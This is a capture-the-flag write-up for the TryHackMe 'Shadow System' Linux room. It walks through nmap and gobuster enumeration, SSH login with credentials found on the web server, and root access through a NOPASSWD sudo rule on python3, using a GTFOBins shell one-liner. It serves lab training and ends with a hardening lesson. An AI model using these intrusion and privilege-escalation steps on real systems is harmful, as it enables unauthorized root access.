# Shadow System — TryHackMe Write-Up

![Platform](https://img.shields.io/badge/Platform-TryHackMe-212c42?style=for-the-badge&logo=tryhackme&logoColor=white)
![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy%20%2F%20Medium-2ea44f?style=for-the-badge)

## Room Overview

**Shadow System** is a Linux boot-to-root Capture The Flag (CTF) machine created for **TryHackMe**. The challenge walks players through service discovery, web directory enumeration, credential retrieval, SSH initial access as `tom`, and local privilege escalation to `root` via misconfigured `sudo` permissions.

* **Room Name:** Shadow System
* **Author:** shadowxy
* **Target OS:** Linux
* **Key Concepts:** Network Enumeration, Web Discovery, SSH Access, Sudo Privilege Escalation

---

## 1. Reconnaissance

Begin by running an Nmap scan against the target IP address to enumerate open ports and running services:

```bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
```

### Discovered Services
| Port | State | Service | Description |
| :--- | :--- | :--- | :--- |
| `22/tcp` | Open | SSH | OpenSSH remote login service |
| `80/tcp` | Open | HTTP | Apache2 web server |

---

## 2. Web Enumeration

Inspect the web application hosted on port `80` and enumerate hidden directories or files using `gobuster`:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

Reviewing the discovered paths (such as `/shadow` and exposed files/backups) reveals credentials belonging to the user `tom`.

---

## 3. Initial Access

Use the discovered credentials to establish an SSH session as `tom`:

```bash
ssh tom@<TARGET_IP>
```

### Retrieving the User Flag
Once authenticated, inspect `tom`'s home directory and read `user.txt`:

```bash
ls -la ~
cat ~/user.txt
```

> **User Flag:** `THM{<user_flag_here>}`

---

## 4. Privilege Escalation

After gaining a foothold on the system, check what commands `tom` is allowed to execute with `sudo`:

```bash
sudo -l
```

### Vulnerability Analysis
The output shows that `tom` can run `python3` as `root` without providing a password (`NOPASSWD`):

```text
(ALL : ALL) NOPASSWD: /usr/bin/python3
```

### Exploiting Sudo Python3
Using a standard GTFOBins payload, spawn an interactive `root` shell via Python's `os` module:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

---

## 5. Root Flag

Verify root privileges and read the final flag from `/root`:

```bash
id
cat /root/root.txt
```

> **Root Flag:** `THM{<root_flag_here>}`

---

## Conclusion

**Shadow System** demonstrates how exposed web artifacts combined with overly permissive `sudo` rules can lead to full system compromise. Always restrict `NOPASSWD` privileges on binaries capable of spawning system shells.
